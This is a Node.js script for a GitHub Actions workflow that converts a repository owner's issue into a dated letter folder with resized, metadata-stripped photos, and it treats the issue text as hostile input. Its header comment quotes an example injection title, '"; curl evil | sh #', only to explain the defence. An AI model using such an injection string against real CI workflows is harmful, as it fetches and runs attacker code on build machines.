// Turn a GitHub issue into a letter folder under src/letters/.
//
// Run by .github/workflows/sync-letters.yml, which has already checked that the
// issue was written *and* saved by the repo owner. Everything here still treats
// the issue text as hostile input:
//
//   * every value arrives through process.env, never through `${{ }}` inside a
//     `run:` block — that form is textual substitution done before bash starts,
//     so a title containing `"; curl evil | sh #` would simply execute;
//   * ImageMagick is invoked with execFileSync and an argv array (no shell), so
//     nothing derived from the issue can break out of an argument;
//   * only GitHub's own attachment hosts are fetched, so the job can't be turned
//     into an arbitrary-URL downloader;
//   * $GITHUB_OUTPUT only ever receives values we generated ourselves.
//
// Zero dependencies: Node built-ins plus global fetch. Nothing to install, and
// almost no supply-chain surface.

import { execFileSync } from 'node:child_process'
import {
  appendFileSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  renameSync,
  rmSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'

const LETTERS_DIR = resolve('src/letters')
const MAX_PHOTOS = 3
const MAX_BYTES = 25 * 1024 * 1024
const TIMEZONE = 'Asia/Jakarta'

/** Only GitHub's own attachment hosts. Anything else is ignored, not fetched. */
const ALLOWED_HOST =
  /^https:\/\/(github\.com\/user-attachments\/assets\/|(private-)?user-images\.githubusercontent\.com\/|raw\.githubusercontent\.com\/)/

const MD_IMAGE = /!\[[^\]]*\]\(\s*<?(https?:\/\/[^\s)>]+?)>?(?:\s+["'][^"']*["'])?\s*\)/g
const HTML_IMAGE = /<img\b[^>]*?\bsrc\s*=\s*["']?(https?:\/\/[^"'\s>]+)/gi

function fail(message) {
  console.error(`sync-letter: ${message}`)
  process.exit(1)
}

function env(name, { required = true } = {}) {
  const value = process.env[name]
  if (required && (value === undefined || value === '')) fail(`${name} is not set`)
  return value ?? ''
}

/**
 * The date the envelope shows.
 *
 * created_at (not updated_at) so editing a letter never moves its date, and
 * converted explicitly: an issue opened at 00:30 in Jakarta is still the previous
 * day in UTC, so a naive UTC date would be a day early for exactly the late-night
 * letters this is for. en-CA formats as ISO yyyy-mm-dd natively.
 */
function jakartaDate(iso) {
  const at = new Date(iso)
  if (Number.isNaN(at.getTime())) fail(`could not parse the issue date: ${iso}`)
  return new Intl.DateTimeFormat('en-CA', {
    timeZone: TIMEZONE,
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
  }).format(at)
}

/**
 * A URL-safe folder name from the title. Thai and emoji collapse to nothing,
 * which is fine — the caller falls back to the issue number, and a number is
 * stable, so those letters simply never get renamed.
 */
function slugify(title) {
  return title
    .normalize('NFKD')
    .replace(/\p{M}/gu, '') // combining marks left behind by NFKD
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 48)
    .replace(/-+$/, '')
}

function imageUrls(body) {
  const found = []
  for (const pattern of [MD_IMAGE, HTML_IMAGE]) {
    for (const match of body.matchAll(pattern)) {
      const url = match[1]
      if (ALLOWED_HOST.test(url) && !found.includes(url)) found.push(url)
    }
  }
  return found
}

/** The letter text: image markup removed, since those became files. */
function proseOf(body) {
  return body
    .replace(/\r\n/g, '\n')
    .replace(MD_IMAGE, '')
    .replace(/<img\b[^>]*>/gi, '')
    .replace(/\n{3,}/g, '\n\n')
    .trim()
}

/** `magick` on ImageMagick 7, `convert` on 6 — runner images have shipped both. */
function magickBinary() {
  for (const bin of ['magick', 'convert']) {
    try {
      execFileSync(bin, ['-version'], { stdio: 'ignore' })
      return bin
    } catch {
      /* try the next one */
    }
  }
  return fail('ImageMagick is not available on this runner')
}

async function downloadPhoto(url, index, intoDir, bin) {
  const response = await fetch(url, { redirect: 'follow' })
  if (!response.ok) fail(`could not download photo ${index + 1}: HTTP ${response.status}`)

  const type = response.headers.get('content-type') ?? ''
  if (!type.startsWith('image/')) fail(`photo ${index + 1} is not an image (${type || 'no type'})`)

  const bytes = Buffer.from(await response.arrayBuffer())
  if (bytes.length === 0) fail(`photo ${index + 1} came back empty`)
  if (bytes.length > MAX_BYTES) fail(`photo ${index + 1} is larger than ${MAX_BYTES} bytes`)

  const raw = join(intoDir, `raw-${index + 1}`)
  writeFileSync(raw, bytes)

  // -auto-orient BEFORE -strip: bake the rotation in, then drop the metadata, or
  // phone photos come out sideways. -strip is also the privacy step — phone EXIF
  // carries GPS coordinates and this repo is public.
  // '1600x1600>' shrinks only; it never upscales a small image.
  execFileSync(bin, [
    raw,
    '-auto-orient',
    '-strip',
    '-resize',
    '1600x1600>',
    '-interlace',
    'Plane',
    '-sampling-factor',
    '4:2:0',
    '-quality',
    '82',
    join(intoDir, `${index + 1}.jpg`),
  ])
  rmSync(raw)
}

/** Any existing folder for this issue, found by the `issue:` key we write. */
function existingFolderFor(issueNumber) {
  if (!existsSync(LETTERS_DIR)) return null
  for (const name of readdirSync(LETTERS_DIR)) {
    const index = join(LETTERS_DIR, name, 'index.md')
    if (!existsSync(index)) continue
    const front = readFileSync(index, 'utf8').split(/\n---/, 1)[0]
    if (new RegExp(`^issue:\\s*${issueNumber}\\s*$`, 'm').test(front)) return name
  }
  return null
}

function output(key, value) {
  const file = process.env.GITHUB_OUTPUT
  if (file) appendFileSync(file, `${key}=${value}\n`)
}

async function main() {
  const title = env('ISSUE_TITLE', { required: false }).trim()
  const body = env('ISSUE_BODY', { required: false })
  const number = env('ISSUE_NUMBER')
  const date = jakartaDate(env('ISSUE_CREATED'))

  const prose = proseOf(body)
  if (prose === '') fail('the issue body is empty — there is no letter to write')

  const slug = slugify(title) || `letter-${number}`
  const folder = `${date}-${slug}`

  const urls = imageUrls(body)
  const wanted = urls.slice(0, MAX_PHOTOS)

  // Build the whole letter somewhere disposable first. Only once every download
  // and conversion has worked does src/letters get touched, so a failure leaves
  // the repo exactly as it was rather than publishing half a letter.
  const staging = mkdtempSync(join(tmpdir(), 'letter-'))
  const staged = join(staging, folder)
  mkdirSync(staged, { recursive: true })

  if (wanted.length > 0) {
    const bin = magickBinary()
    for (const [index, url] of wanted.entries()) {
      await downloadPhoto(url, index, staged, bin)
    }
  }

  const frontmatter = ['---']
  if (title) frontmatter.push(`title: ${title.replace(/\n/g, ' ')}`)
  frontmatter.push(`date: ${date}`, `issue: ${number}`, '---', '')
  writeFileSync(join(staged, 'index.md'), `${frontmatter.join('\n')}\n${prose}\n`, 'utf8')

  // Replace rather than merge, so photos removed from the issue actually go away
  // instead of leaving a stale 3.jpg behind.
  mkdirSync(LETTERS_DIR, { recursive: true })
  const previous = existingFolderFor(number)
  if (previous && previous !== folder) {
    rmSync(join(LETTERS_DIR, previous), { recursive: true, force: true })
    console.log(`sync-letter: renamed ${previous} -> ${folder}`)
  }
  const target = join(LETTERS_DIR, folder)
  rmSync(target, { recursive: true, force: true })
  renameSync(staged, target)
  rmSync(staging, { recursive: true, force: true })

  const kept = readdirSync(target).filter((n) => n.endsWith('.jpg')).length
  console.log(`sync-letter: wrote ${folder} (${kept} photo(s) of ${urls.length} found)`)

  output('letter_slug', folder)
  output('photo_count', String(kept))
  output('photos_found', String(urls.length))
}

if (!existsSync('src')) fail('run this from the repository root')

await main()
